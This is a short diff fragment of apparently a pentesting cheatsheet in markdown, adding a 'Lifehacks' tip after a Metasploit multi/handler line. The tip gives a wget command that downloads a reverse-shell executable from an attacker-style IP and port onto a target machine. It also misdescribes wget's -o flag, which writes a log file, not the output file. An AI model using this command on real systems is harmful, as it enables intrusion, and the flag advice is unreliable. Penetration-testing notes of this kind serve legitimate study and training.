@@ -149,3 +149,11 @@ msf6 exploit(multi/handler) > exploit -j
 ```
 
 ***
+
+## Lifehacks
+
+* Use wget -o parameter when you want to install revshell file into machine like:&#x20;
+
+```
+wget http://13.13.13.13:1337/shell.exe -o shell.exe
+```
